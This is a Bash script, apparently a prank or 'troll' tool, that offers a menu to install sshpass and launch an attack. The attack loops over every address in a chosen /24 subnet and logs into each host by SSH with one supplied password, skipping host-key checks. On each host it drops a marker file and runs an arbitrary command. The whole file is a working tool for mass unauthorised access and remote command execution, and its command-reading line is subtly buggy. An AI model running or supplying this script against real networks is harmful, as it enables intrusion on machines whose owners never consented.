#!/usr/bin/env bash

#MIT License

#Copyright (c) 2020 Javier Vidal Ruano

#Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the "Software"), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:

#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.

#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#SOFTWARE.

# FUNCTIONS
function checkOption(){
        case $1 in
                1)
                        echo ''
                        echo '[*] You chose to install dependencies'
                        installDependencies
                        ;;
                2)
                        echo ''
                        echo '[*] You chose to attack'
                        read -p 'Username: ' USERNAME
                        read -p 'Password: ' PASSWORD
                        read -p 'Subnet address (Example: 192.168.1): ' IP
                        read -p 'Command to execute: ' $COMMAND
                        troll $USERNAME $PASSWORD $IP $COMMAND
                        ;;
                99)
                        exit
                        ;;
                *)
                        echo ''
                        echo '[-] Error: Wrong option'
                        ;;
        esac
}

function installDependencies(){
        sudo apt install sshpass openssh-client -y
}

function menu(){
        while true; do
                echo 'MENU:'
                echo '  1-Install dependencies (recommended if this is your first time)'
                echo '  2-Launch attack'
                echo '  99-Exit'
                echo ''
                read -p 'OPTION: ' OPTION
                checkOption $OPTION
                read -p 'Press enter to continue'
                clear
        done
}

function troll(){
        USER=$1
        PASSWORD=$2
        SUBNET=$3 #'192.168.1'
        echo "[*] Starting attack on subnet ${SUBNET}.0/24"
        SECONDS=0
        for COUNTER in $(seq 2 254); do
                echo "[*] Attacking ${USER}@${SUBNET}.${COUNTER}"
                sshpass -p${PASSWORD} ssh -t -oStrictHostKeyChecking=no ${USER}@${SUBNET}.${COUNTER} "touch ~/trolled.haha; $COMMAND" 2>/dev/null &
        done
        echo '[*] Attack done'
        ELAPSED_TIME="[*] Elapsed time: $(($SECONDS / 3600))hrs $((($SECONDS / 60) % 60))min $(($SECONDS % 60))sec"
        echo $ELAPSED_TIME
}

# MAIN
menu
